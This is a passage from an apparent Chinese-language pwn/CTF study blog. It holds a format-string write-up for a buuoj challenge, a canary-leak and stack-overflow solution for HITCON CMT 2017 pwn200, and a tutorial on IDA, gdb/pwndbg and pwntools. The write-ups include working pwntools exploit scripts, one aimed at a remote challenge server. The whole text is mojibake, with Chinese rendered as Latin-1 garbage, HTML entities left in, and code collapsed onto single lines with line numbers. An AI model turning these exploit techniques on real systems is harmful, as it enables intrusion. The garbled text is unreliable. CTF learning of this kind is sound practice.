2.æ‰¾åˆ°è¿™ä¸ªåœ°å€åœ¨æ ˆä¸­çš„ä½ç½®,éœ€è¦ç§»åŠ¨å¤šå°‘ä¸ªä½ç½®èƒ½åˆ°è¿™é‡Œ
3.åˆ©ç”¨%néšä¾¿å†™å…¥ä¸€ä¸ªå€¼å³å¯
4.passwdè¾“å…¥å¯¹åº”çš„å€¼å³å¯
â€‹		é¦–å…ˆ,è¦ä¿®æ”¹çš„å€¼çš„åœ°å€å°±æ˜¯0x804c044,ç¬¬ä¸€ä¸ªé—®é¢˜è§£å†³.è¿™ä¸ªæ˜¯å› ä¸ºidaåœ¨å‘½åçš„æ—¶å€™å¦‚æœæ²¡æœ‰ç¬¦å·è¡¨ä¼šç”¨åœ°å€ä¹‹ç±»çš„å‘½å,æ‰€ä»¥å¯ä»¥ç›´æ¥çœ‹å‡ºæ¥..bss:0804C044 unk_804C044
â€‹		å®ƒçš„é€»è¾‘å°±æ˜¯ä»&#x2F;dev&#x2F;urandomè¯»å–ä¸€ä¸ªå€¼åˆ°è¿™ä¸ªåœ°å€
å¯»æ‰¾å†™å…¥ä½ç½®å¯»æ‰¾åœ°å€åœ¨æ ˆä¸­çš„ä½ç½®å¯ä»¥è¿›è¡Œå°è¯•,æˆ–è€…åˆ©ç”¨gdbè°ƒè¯•æŸ¥çœ‹
pwndbg&gt; rStarting program: &#x2F;home&#x2F;ubuntu&#x2F;str&#x2F;pwn5&#x2F;pwnyour name:aaaaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%xHello,aaaaaaffffd548.63.0.f7ffda9c.3.f7fd0410.1.0.1.61616161.78256161.2e78252e.252e7825
å¯ä»¥çœ‹åˆ°,æ˜¯ç¬¬10ä¸ª,
æˆ–è€…åˆ©ç”¨aaaa%10$x æ¥ä¸€ä¸ªä¸€ä¸ªå°è¯•            æ•°å­—å’Œ$çš„ç»„åˆä»£è¡¨äº†æŸ¥çœ‹ç¬¬å‡ ä¸ªå€¼
your name:aaaa%10$xHello,aaaa61616161
å†™å…¥å…·ä½“çš„å€¼æ‰€ä»¥å¯ä»¥ç”¨
p32(0x804c044) + bâ€%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%nâ€ å°†å€¼å†™å…¥,å†™å…¥çš„å€¼çš„å¤§å°æ˜¯
6+8+9*8 &#x3D; 86
ç®—çš„ä¸å¯¹,å¯ä»¥åœ¨è°ƒè¯•çš„æ—¶å€™æ£€æŸ¥ä¸€ä¸‹
12pwndbg&gt; x/wx 0x804c0440x804c044:      0x0000004c

0x4 &#x3D; 76
6 + 4 + 8*8 &#x3D; 76  6æ˜¯hello,  4æ˜¯p32()  32ä½,å››ä¸ªå­—èŠ‚
passwdè¾“å…¥å¯¹åº”çš„å€¼ç›´æ¥è¾“å…¥å¯¹åº”çš„æ•°å­—å³å¯ è®°å¾—æ˜¯biniayç±»å‹çš„
atoiå‡½æ•°ä¼šæŠŠå­—ç¬¦è½¬åŒ–æˆæ•´æ•°,ä½†ç›´æ¥è¾“å…¥binaryçš„æ•°å­—ä¹Ÿå¯ä»¥
exp12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io,&quot;break main&quot;)pause()payload = p32(0x804c044) + b&quot;%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n&quot;io.sendline(payload)pause()io.sendlineafter(&#x27;passwd:&#x27;,b&#x27;76&#x27;)io.interactive()å»é™¤è°ƒè¯•ä¿¡æ¯ç‰ˆæœ¬,è®°å¾—è¿™é‡Œä¿®æ”¹payloadå,passwdçš„é•¿åº¦ä¹Ÿå˜äº†,è¿™é‡Œå°±åªæœ‰p32çš„é•¿åº¦4äº†from pwn import *context.log_level= &quot;debug&quot;io = remote(&quot;node4.buuoj.cn&quot;,25184)payload = p32(0x804c044) + b&#x27;%10$n&#x27;io.sendlineafter(&#x27;name:&#x27;,payload)io.sendlineafter(&#x27;passwd:&#x27;,b&#x27;4&#x27;)io.interactive()



æ€»ç»“1.è™½ç„¶å¼€äº†NXå’Œcanaryä¿æŠ¤,ä½†æ˜¯ä¸ç”¨æ ˆæº¢å‡º,æ‰€ä»¥ä¸å½±å“.è¿™é‡Œä¸æº¢å‡ºçš„ä¸€ä¸ªå…³é”®ç‚¹å¤§æ¦‚æ˜¯ nameç»™çš„å¤§å°è¶³å¤Ÿå¤§?å¦‚æœç»™å°äº†å¯èƒ½æ˜¯å¦å¤–çš„äº†?
hitcon cmt 2017 pwn200é¢˜ç›®ç»™äº†æºç 
123456789101112131415#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void canary_protect_me()&#123;    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[40];    gets(buf);    printf(buf);    gets(buf);    return 0;&#125;



ç¼–è¯‘:gcc -m32 -z lazy -z nonexecstack -fstack-protector -no-pie pwn200.c -o pwn200
å­˜åœ¨æ ˆæº¢å‡º,ä½†æ˜¯æœ‰ä¿æŠ¤nxå’Œcanary, æ€è·¯å¤§æ¦‚æ˜¯è¦†ç›–è¿”å›åœ°å€ä¸ºcanary_protect_me,è¦†ç›–è°çš„è¿”å›åœ°å€å‘¢?è¦†ç›–ä¸‹ä¸€ä¸ªgetsçš„?ä¸æ˜¯è¿™ä¸ªé€»è¾‘,å®ƒè¿˜æ²¡æœ‰è°ƒç”¨,æ²¡æœ‰è¿”å›å€¼,é‚£å°±æ˜¯è¦†ç›–mainå‡½æ•°çš„?
æ­£ç¡®çš„é€»è¾‘æ˜¯ æ³„éœ²canaryç„¶åæ ˆæº¢å‡ºè¦†ç›–è¿”å›å€¼
æ‰€ä»¥é—®é¢˜æ˜¯canaryåœ¨å“ª?  è¿™ä¸¤å¥,ç¬¬ä¸€å¥æŠŠcanaryèµ‹å€¼ç»™eaxç„¶åèµ‹å€¼ç»™ ebp -0xc | å›å¤´ä¸“é—¨ç ”ç©¶ä¸‹canary
120x804859e &lt;main+29&gt;    mov    eax, dword ptr gs:[0x14]0x80485a4 &lt;main+35&gt;    mov    dword ptr [ebp - 0xc], eax



æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³„éœ² ebp - 0xcè¿™ä¸ªä½ç½®çš„å€¼,ç„¶åå°±å¯ä»¥æº¢å‡º,è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥äº†,ä½†æ˜¯è°ƒç”¨printfçš„æ—¶å€™,ebpä¸ä¼šæ”¹å˜å—???
è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹,ä¸ä¼šâ€¦ä¸ºå•¥å‘¢?
12345ä¸€å¼€å§‹canaryçš„ä½ç½®  0xffffd5bc0b:002câ”‚     0xffffd5bc â—‚â€” 0x50b7d5000c:0030â”‚     0xffffd5c0 â€”â–¸ 0xffffd5e0 â—‚â€” 0x10d:0034â”‚     0xffffd5c4 â—‚â€” 0x00e:0038â”‚ ebp 0xffffd5c8 â—‚â€” 0x0

å’Œespå·®äº†15ä¸ª?
payload1  %15$x
ç„¶åæ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸ºcanary_protect_meçš„            0x8048556 (p canary_protect_me æ‰“å°å³å¯) 0x80491a2
payload2 40*â€™aâ€™ + canary + 12 * â€˜bâ€™ + p32(0x8048556)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccccccccccddddeeeeeeeeeeeeeeee
è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹,å°±æ˜¯æ€ä¹ˆæ­£ç¡®æ¥æ”¶canary,ç„¶åæ‹¼æ¥ä¸Š
æ˜¯åœ°å€å¯¹å…¶çš„é—®é¢˜å—?? ä¸€ç›´ä¸æˆåŠŸ
ä½†æ˜¯ä¸ºä»€ä¹ˆç”¨å®˜æ–¹ç»™çš„æ–‡ä»¶å°±å¯ä»¥??     https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61
  æ˜¯ç¼–è¯‘å™¨çš„é—®é¢˜å—â€¦è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹
123456789101112from pwn import *#r = remote(&#x27;bamboofox.cs.nctu.edu.tw&#x27;,22002)r = process(&quot;./binary_200&quot;)func = 0x0804854dr.sendline(&#x27;%15$x&#x27;)canary = int(r.recv(), 16)payload = b&#x27;A&#x27;*40 + p32(canary) + b&#x27;B&#x27;*12 + p32(func)r.sendline(payload)r.interactive()





è¿™è¾¹è”åŠ¨pwntoolsè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜â€¦ç ”ç©¶ä¸€ä¸‹
æ­£ç¡®çš„åº”è¯¥æ˜¯è¿™æ ·

ä¸è¡Œçš„expå’Œè¿™ä¸ªæ„Ÿè§‰æ²¡å•¥åŒºåˆ«,ä½†æ˜¯æœ€åæŠ¥é”™äº†&lt;Could not read memory at 0x4242423e&gt;
è¿”å›åœ°å€é‚£é‡Œçš„é—®é¢˜æ„Ÿè§‰æ˜¯
è¿™ä¸ªæ˜¯æœ‰é—®é¢˜çš„,


è¿™ä¸ªæ˜¯æ­£å¸¸çš„



æ–‡ä»¶å·²ä¿å­˜â€¦åé¢å¯ä»¥å†æ£€æŸ¥ä¸‹â€¦â€¦
hitcon cmt 2017 pwn300https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/" title="pwnå…¥é—¨-6-å¸¸è§å·¥å…·ä½¿ç”¨å…¥é—¨">pwnå…¥é—¨-6-å¸¸è§å·¥å…·ä½¿ç”¨å…¥é—¨</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-01-24T10:13:28.000Z" title="å‘è¡¨äº 2023-01-24 18:13:28">2023-01-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-01-28T13:57:11.590Z" title="æ›´æ–°äº 2024-01-28 21:57:11">2024-01-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">å¯’å‡ä¸€å›æ¥,ä¸€æ®µæ—¶é—´æ²¡ç”¨,æœ‰ç‚¹æ‰‹ç”Ÿäº†,è§‰å¾—è¿˜æ˜¯éœ€è¦å†™ä¸€ç¯‡åšå®¢æ¥æ¢³ç†ä¸€ä¸‹å¸¸è§å·¥å…·çš„ä½¿ç”¨.
ä¸»è¦æ˜¯é™æ€åˆ†æã€åŠ¨æ€åˆ†æã€è„šæœ¬ç¼–å†™ã€å°å·¥å…·
é™æ€åˆ†æ:IDA proida é‡Œé¢å¾ˆå¤šå¥‡æ€ªçš„ä¸œè¥¿dword ptr
qword ptr
idaçš„æ•°æ®ç±»å‹:https://blog.csdn.net/m0_43406494/article/details/109110983
å›¾å½¢æ¨¡å¼è®¾ç½®ä¸€ä¸‹è¿™ä¿©,è¡Œå·å’Œæ˜¾ç¤ºæ•°æ®å†…å®¹

ç®­å¤´çº¢è‰²: æ¡ä»¶è·³è½¬æ²¡æœ‰è¢«é‡‡ç”¨
ç»¿è‰²: æ¡ä»¶è·³è½¬è¢«é‡‡ç”¨
è“è‰²: æ— æ¡ä»¶è·³è½¬è¢«é‡‡ç”¨
æ–¹å‘å‘ä¸Šè¡¨ç¤ºå¾ªç¯
æ–‡æœ¬æ¨¡å¼
åœ¨è®¾ç½®é‡Œå¯ä»¥æ‰“å¼€ auto comments è‡ªåŠ¨æ³¨é‡Š
è§†å›¾æ–‡ä»¶æ“ä½œé€‰æ‹©Windowsä¸­çš„Reset Desktopè¿”å›é»˜è®¤ è§†å›¾ 
 é€‰æ‹©Windowsä¸­çš„Save Desktopä¿å­˜è¿™ä¸ª æ–°è§†å›¾
é…ç½®æ–‡ä»¶å—??
åé€€æ“ä½œ esc
å‰è¿›æ“ä½œ ctrl+enter
å¸¸ç”¨å¿«æ·é”®:Table åˆ‡æ¢è§†å›¾
å¿«æ·é”®
p åœ¨æ±‡ç¼–ä¸­å‡½æ•°å¼€å¤´ä½¿ç”¨p,ä»å½“å‰åœ°å€å¤„è§£æä¸ºå‡½æ•°
u
c è½¬æ¢æˆä»£ç 
æ•°æ®æ“ä½œ:shift + f12 æ˜¾ç¤ºå­—ç¬¦ä¸²string
D â€“ è®¾ç½®æ•°æ® (Data)  1å­—èŠ‚ 2å­—èŠ‚ 4å­—èŠ‚ 8å­—èŠ‚ è¿›è¡Œå¾ªç¯ 
C â€“ è®¾ç½®ä»£ç  (Code) è®¾ç½®ä¸ºæŒ‡ä»¤ 
A â€“ è®¾ç½®ASCIIå­—ç¬¦ä¸² (ASCII)
*è®¾ç½®æ•°ç»„ 
O â€“ è®¾ç½®åœ°å€åç§» (Offset) 
U â€“ å–æ¶ˆå®šä¹‰ (Undefine) 
X â€“ äº¤å‰å¼•ç”¨æŸ¥æ‰¾ (Cross-reference, Xref)
å‡½æ•°æ“ä½œP â€“ åˆ›å»ºå‡½æ•° Del â€“ åˆ é™¤å‡½æ•° Ctrl+E â€“ ä¿®æ”¹å‡½æ•°(å‡½æ•°çª—å£)
Alt+P ä¿®æ”¹å‡½æ•°(åæ±‡ç¼–çª—å£)
ä¼ªä»£ç æ“ä½œN â€“ ä¿®æ”¹æ ‡è¯†ç¬¦åç§° (Name) 
Y â€“ ä¿®æ”¹æ ‡è¯†ç¬¦ç±»å‹ (tYpe) æ¯”å¦‚intç±»å‹è¿˜æ˜¯doubleè¿˜æ˜¯ä»€ä¹ˆ
æœç´¢alt+tæŸ¥æ‰¾å­—ç¬¦ä¸²
a è½¬æ¢æˆå­—ç¬¦ä¸²
d åˆ†å¼€çš„å­—ç¬¦
Gè·³è½¬æŒ‡å®šåœ°å€
x äº¤å‰å¼•ç”¨ (å‡½æ•°å’Œæ•°æ®éƒ½æœ‰)
: åŠ ä¸€æ¡æ³¨é‡Š
; æ‰€æœ‰äº¤å‰å¼•ç”¨éƒ½ä¼šå›æ˜¾è¿™ä¸ªæ³¨é‡Š
ç±»å‹
WORD (w)  16ä½ æ— ç¬¦å·æ•°å€¼ 

DWORD (dw) 32ä½ æ— ç¬¦å·æ•°å€¼


è„šæœ¬ç¼–å†™åŠ¨æ€åˆ†æ:gdb(pwndbgæ’ä»¶)There are a number of good gdb crash courses &#x2F; reference manuals:

GDBâ€™s documentation

Tudorâ€™s gdb crash course

gdb debugging full example

pwndbg: a gdb extension (feature list)

gef: another gdb extension (feature list)

The course Debuggers 1012: Introductory GDB from OpenSecurityTraining2.


pwn.college https://www.youtube.com/watch?v=r185fCzdw8Y
pwndbgå®˜æ–¹æ–‡æ¡£:https://browserpwndbg.readthedocs.io/en/docs/
https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md
gdbå®˜æ–¹æ–‡æ¡£:
è°ƒæ•´æŠŠ stack å’Œ backtraceçš„è¡Œæ•°å‡å°‘,ä¸ç„¶çœ‹ä¸è§ä¸Šé¢çš„æ±‡ç¼–äº†
é…ç½®æ–‡ä»¶:https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md
ä¿®æ”¹é…ç½®æ–‡ä»¶å°±å¯ä»¥äº†
æ‰¾åˆ°pwndbgçš„ä¸‹è½½ç›®å½•çš„è¿™ä¸ªæ–‡ä»¶pwndbg&#x2F;pwndbg&#x2F;commands&#x2F;context.py 
12345678751è¡Œstack_lines = pwndbg.gdblib.config.add_param(    &quot;context-stack-lines&quot;, 8, &quot;number of lines to print in the stack context&quot;)766è¡Œbacktrace_lines = pwndbg.gdblib.config.add_param(    &quot;context-backtrace-lines&quot;, 8, &quot;number of lines to print in the backtrace context&quot;)



å¯åŠ¨è°ƒè¯•gdb filename
gdb processName PID æˆ–è€… gdb -p 
æ·»åŠ å‚æ•° 
gdb -args .&#x2F;a.out a b c
æ–­ç‚¹ç›¸å…³b å‡½æ•°å,å¦‚æœæœ‰ç¬¦å·è¡¨çš„è¯å¯ä»¥,ä¾‹å¦‚b gets
b åœ°å€  ä¾‹å¦‚:b *0x3123213  è¿™æ ·æ‰“
info b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯
delete n åˆ é™¤nå·æ–­ç‚¹
è¿è¡Œr è¿è¡Œç¨‹åº,ä¼šä¸€ç›´è¿è¡Œ,ç›´åˆ°æ¯”å¦‚éœ€è¦è¾“å…¥ä»€ä¹ˆä¸œè¥¿ç­‰
s ä»å¤´å¼€å§‹è¿è¡Œ,æ–­åˆ°ç¬¬ä¸€è¡Œ
c è¿è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹
è°ƒè¯•åœ°å€ å°±æ˜¯ è¿™ä¸ªç¨‹åºçš„åŸºåœ°å€ + idaä¸­çš„åœ°å€
n å•æ­¥æ‰§è¡Œ,(æœ‰å‡½æ•°çš„è¯ç›´æ¥è·³è¿‡ä¸è¿›å…¥)
s å•æ­¥è¿›å…¥,æœ‰å‡½æ•°çš„è¯ä¼šè¿›å…¥
finish æ‰§è¡Œå®Œå½“å‰å‡½æ•°,è¿”å›è°ƒç”¨å®ƒçš„å‡½æ•°
æ€ä¹ˆæŸ¥çœ‹è‡ªå·±å½“å‰åœ¨å“ªä¸€è¡Œ??å’Œä¸‹é¢çš„ä»£ç ??
disass 
è¿è¡Œçš„æ—¶å€™ æ€ä¹ˆ æ·»åŠ å‚æ•°?
æŸ¥çœ‹ä¿¡æ¯codebase æŸ¥çœ‹åœ°å€ (è°ƒè¯•åœ°å€ å°±æ˜¯ è¿™ä¸ªç¨‹åºçš„åŸºåœ°å€ + idaä¸­çš„åœ°å€)
vmmapæŸ¥çœ‹å†…å­˜æ˜ å°„mmapåœ°å€ ä¿¡æ¯
teles æŸ¥çœ‹æ ˆçš„ä¿¡æ¯
p  å˜é‡å æŸ¥çœ‹å˜é‡åœ°å€
info 
reg æŸ¥çœ‹å¯„å­˜å™¨ä¿¡æ¯
dereference $esp æ˜¯å•¥??
æŸ¥çœ‹å†…å­˜ä¿¡æ¯ä½¿ç”¨examineå‘½ä»¤ï¼ˆç®€å†™æ˜¯xï¼‰æ¥æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼
x&#x2F;nuf  ä¾‹å¦‚x &#x2F;20wx 0x0000000
næ˜¯ä¸ªæ•°,è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åæ˜¾ç¤ºçš„å†…å­˜çš„é•¿åº¦,å³æ˜¾ç¤ºå‡ ä¸ªåœ°å€çš„å†…å®¹
uè¡¨ç¤º,ä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°,ä¸æŒ‡å®šçš„è¯é»˜è®¤4bytes,32ä½.bè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­—èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚
 fæ˜¯æ˜¾ç¤ºçš„æ ¼å¼( iå¯ä»¥æŸ¥çœ‹æ±‡ç¼–ä»£ç )

123456789pwndbg&gt; x/4bx 0x7fffffffe4900x7fffffffe490:	0x00	0x80	0x00	0x00pwndbg&gt; x/4hx 0x7fffffffe4900x7fffffffe490:	0x8000	0x0000	0x0001	0x0000pwndbg&gt; x/4wx 0x7fffffffe4900x7fffffffe490:	0x00008000	0x00000001	0x55554759	0x00005555pwndbg&gt; x/4gx 0x7fffffffe4900x7fffffffe490:	0x0000000100008000	0x00005555555547590x7fffffffe4a0:	0x0000000000000000	0xa2698e7a0212c01a



å †ç›¸å…³heap æŸ¥çœ‹å †çš„ä¿¡æ¯
heap bins æŸ¥çœ‹binsçš„ä¿¡æ¯
heap chunks æŸ¥çœ‹chunkçš„ä¿¡æ¯
Vis æŸ¥çœ‹å †å†…å­˜
ä¿®æ”¹å†…å­˜ã€å¯„å­˜å™¨ç­‰ æ–¹ä¾¿è°ƒè¯•set $eip &#x3D; xxxx
set {unsigned int}0x8048a51&#x3D;0x0
find å†…å­˜æœç´¢
å…¶ä»–watch ç›‘æµ‹ç‚¹?
canary
q é€€å‡º
display &#x2F;3i $rip è®¾ç½®å•æ­¥æ‰§è¡Œåè‡ªåŠ¨æ˜¾ç¤ºçš„å†…å®¹,è¿™é‡Œæ˜¾ç¤ºåç»­ä¸‰æ¡æŒ‡ä»¤
æŸ¥çœ‹å¯„å­˜å™¨
(gdb) i r (gdb) i r a # æŸ¥çœ‹æ‰€æœ‰å¯„å­˜å™¨ï¼ˆåŒ…æ‹¬æµ®ç‚¹ã€å¤šåª’ä½“ï¼‰ (gdb) i r esp (gdb) i r pc
info reg
è°ƒè¯•ä¸€ä¸‹è¾“å‡ºä¸º16è¿›åˆ¶å§: set output-radix 16
eb address [data [data â€¦]]
ç»“æ„ä½“ç›¸å…³p ç»“æ„ä½“åå­—
p *(struct  xxx *) addr
123456pwndbg&gt; p *(DSI *) dsivalue of type `DSI&#x27; requires 67416 bytes, which is more than max-value-sizepwndbg&gt; p dsi$4 = (DSI *) 0x5555555b8960pwndbg&gt; p *(DSI *) 0x5555555b8960value of type `DSI&#x27; requires 67416 bytes, which is more than max-value-size



è°ƒè¯•æŠ€å·§ä¸‹å¥½æ–­ç‚¹,ç„¶åå¤šç”¨c,åœ¨å †çš„è°ƒè¯•ä¸­å¾ˆå¥½ç”¨
pwntoolsä¸­åŠ input()
gdbä¸­æ€ä¹ˆçœ‹æ–‡ä»¶æè¿°ç¬¦å‘¢,æœ‰å¤šå°‘ä¸ª,æ‰“å¼€çš„  ll &#x2F;proc&#x2F;1562844&#x2F;fd éœ€è¦çœ‹è¿›ç¨‹ä¿¡æ¯
https://www.cnblogs.com/mfryf/p/5329770.html
vmmap æŸ¥çœ‹å†…å­˜åˆ†å¸ƒ
å­è¿›ç¨‹è°ƒè¯•https://blog.csdn.net/cjfeii/article/details/21647663
 set detach-on-fork off
æœ‰å¥½å‡ ç§æ¨¡å¼
info threads
åˆ‡æ¢çº¿ç¨‹
 info inferiors
https://blog.csdn.net/bsp_mpu6050/article/details/107886383
è„šæœ¬ç¼–å†™:pwntoolså®˜æ–¹æ–‡æ¡£:https://docs.pwntools.com
https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html
123456789101112131415161718192021222324252627282930from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./pwn3&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io,&quot;b main&quot;)#pause()#io.sendlineafter(&#x27;Input:&#x27;,payload)io.interactive()from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./pwn3&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.debug(io,&quot;b main&quot;)#pause()#io.sendlineafter(&#x27;Input:&#x27;,payload)io.interactive()

https://blog.csdn.net/fjh1997/article/details/105434992/
é…åˆgdbåœ¨è¾“å…¥ä¸€æ®µæ•°æ®å æ–­ä¸‹,æ¯”å¦‚å­—ç¬¦ä¸²çš„é‚£ä¸ªä¾‹å­,æˆ‘ä»¬æƒ³è¦æŸ¥çœ‹åˆšåˆšè¾“å…¥å®Œæ•°æ®åçš„æƒ…å†µ,
ç¬¬ä¸€ç§æ–¹æ³•,æ‰¾åˆ°æ–­ç‚¹
12345678  0x5655563b &lt;fmtstr+110&gt;    push   0x63  0x5655563d &lt;fmtstr+112&gt;    lea    eax, [ebp - 0x70]â–º 0x56555640 &lt;fmtstr+115&gt;    push   eax  0x56555641 &lt;fmtstr+116&gt;    call   fgets@plt                    &lt;fgets@plt&gt;  0x56555646 &lt;fmtstr+121&gt;    add    esp, 0x10  0x56555649 &lt;fmtstr+124&gt;    sub    esp, 0xc  0x5655564c &lt;fmtstr+127&gt;    lea    eax, [ebp - 0x70]



attachçš„æ—¶å€™æ–­åˆ°æ–­ç‚¹è¿™é‡Œå°±å¥½äº†,ç„¶å gdbé‚£è¾¹c, ç„¶åpwntoolsè¿™è¾¹æ‰§è¡Œä¸€ä¸‹(å›è½¦) å³å¯, æˆ–è€…ä¸ç”¨pause, ç›´æ¥åœ¨gdbé‚£cä¸€ä¸‹å°±è¡Œäº†
12345678910111213141516from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./vul32&quot;)#io = process(&quot;./pwn3&quot;,&quot;b main&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io,&quot;break *0x56555646&quot;)#gdb.debug(&quot;./vul32&quot;,&quot;break main&quot;)pause()io.sendline(&quot;aaaaaa&quot;)pause()#io.sendlineafter(&#x27;Input:&#x27;,payload)io.interactive()



__kernel_vsyscall+ ä¸€ä¸Šæ¥çš„è¿™ä¸ªæ˜¯ä»€ä¹ˆ?????????? è¿™æ˜¯è¿›å…¥åˆ°äº†å†…æ ¸é‡Œé¢å§ å¯ä»¥é€šè¿‡backtraceæ¥çœ‹
#6  0xf7e4b29c in _IO_fgets
#7  0x56555646 in fmtstr ()#8  0x565556a5 in main ()#9  0xf7dfdfa1 in __libc_start_main (main&#x3D;0x56555685 , argc&#x3D;1, argv
ç¡®å®æ˜¯è¿›å…¥åˆ°æ–­ç‚¹åçš„ä½ç½®
å³è¾¹cçš„æ—¶å€™,éœ€è¦å·¦è¾¹pwntoolsè¿™è¾¹è¿›è¡Œè¾“å…¥,å³è¾¹ä¸èƒ½è¿›è¡Œè¾“å…¥çš„
ç¬¬äºŒç§,ç›´æ¥åœ¨å¼€å¤´å°±æ–­ç‚¹å°±å¥½äº†
pwntoolsåŸºç¡€æ“ä½œsendå’Œsendlineçš„åŒºåˆ«,sendåªæ˜¯å‘é€æ•°æ®,sendlineå‘é€ä¸€è¡Œæ•°æ®,ä¹Ÿå°±æ˜¯é™¤äº†æ•°æ®,è¿˜ä¼šåŠ ä¸€ä¸ªæ¢è¡Œ(å›è½¦)
https://blog.csdn.net/weixin_45556441/article/details/113982718
å®‰è£…apt-get install libffi-dev,libssl-dev
pip install pwntools
ç¯å¢ƒå˜é‡è®¾ç½®â€‹		è®¸å¤šéƒ½æ˜¯é€šè¿‡å…¨å±€å˜é‡contextè¿›è¡Œè®¾ç½®çš„,ä¾‹å¦‚æ“ä½œç³»ç»Ÿ,æ¶æ„,å­—èŠ‚åºç­‰
12context.os = &#x27;linux&#x27;context.log_level = &quot;debug&quot;  True





è¿æ¥åŠäº¤äº’1234567891011121314file = process(&quot;./pwn&quot;)		#æœ¬åœ°æ–‡ä»¶         p= remote(&quot;xx.xx.xx.xx&quot;,12345)		#è¿œç¨‹		p.send(payload)    #å‘é€æ•°æ®p.sendline(payload) #å‘é€æ•°æ®å¹¶æ·»åŠ æ¢è¡Œç¬¦p.senduntil?p.sendafter(string)p.sendlineafter()p.recv(count) # æ¥æ”¶counté•¿åº¦çš„ä¿¡æ¯p.recvuntil(string,drop=True or False) #è¿”å›ç›´åˆ°æ¥æ”¶åˆ°æŒ‡å®šå­—ç¬¦ä¸²çš„ä¿¡æ¯,dropå‚æ•°å¯ä»¥æŒ‡å®šæ˜¯å¦åŒ…å«ç»ˆæ­¢å­—ç¬¦ä¸²p.clear() # æ¸…ç©ºæ¶ˆæ¯ç¼“å­˜p.interactive() # ä¸ç¨‹åºè¿›è¡Œäº¤äº’



ç¼–ç ç±»â€‹		æ¼æ´åˆ©ç”¨æ—¶,payloadå¯èƒ½æœ‰å„ç§å½¢å¼,8.16,32,64ä½ã€å¤§ç«¯å°ç«¯,pwntoolsæä¾›äº†ç¼–ç å’Œè§£ç çš„å‡½æ•°,på¼€å¤´æ˜¯ç¼–ç ,uå¼€å¤´æ˜¯è§£ç ,åé¢è·Ÿç€çš„æ˜¯ä½æ•°. æ­¤å¤–è¿˜æä¾›äº†asmå’Œdisasmä¸¤ä¸ªå‡½æ•°è¿›è¡Œæ±‡ç¼–å’Œåæ±‡ç¼–çš„è½¬æ¢
12p32(0x8040000)  &#x27;\x00\x00\x04\x08&#x27;hex(u32(&#x27;\x00\x00\x04\x08&#x27;))    &#x27;0x8040000&#x27;

æ–‡ä»¶ä¿¡æ¯è·å–ç±»â€‹		è·å–äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…libcç­‰çš„got pltè¡¨åœ°å€,æˆ–è€…åç§»ç­‰
123456elf = ELF(&#x27;bin-path&#x27;) #åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶elf.got[&#x27;fun_name&#x27;] #è·å–å¯¹åº”å‡½æ•°çš„gotè¡¨åœ°å€elf.plt[&#x27;fun_name&#x27;] #è·å–å¯¹åº”å‡½æ•°çš„pltè¡¨åœ°å€libc = ELF(&#x27;libc-path&#x27;) #åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶libc.symbols[â€˜systemâ€™] #è·å–å‡½æ•°åœ°å€   libc.sym[&#x27;system&#x27;] æœ‰ä»€ä¹ˆåŒºåˆ«??

symbolså’Œgot pltçš„å…³ç³»???3
